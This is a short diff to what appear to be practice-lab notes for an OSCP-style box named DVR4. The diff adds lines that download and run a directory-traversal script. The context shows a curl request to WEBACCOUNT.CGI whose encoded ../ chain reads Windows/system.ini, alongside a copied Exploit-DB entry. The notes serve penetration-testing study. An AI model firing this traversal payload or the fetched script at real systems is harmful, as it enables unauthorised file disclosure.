@@ -62,4 +62,7 @@ cp /usr/share/exploitdb/exploits/windows_x86/webapps/45296.txt ./
 
 curl "http://VICTIM-IP:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
 
+wget https://raw.githubusercontent.com/meltingscales/oscp/refs/heads/main/boxes/provinggrounds/DVR4/ArgusDirTraverse.py
+
+python ArgusDirTraverse.py 
 ```
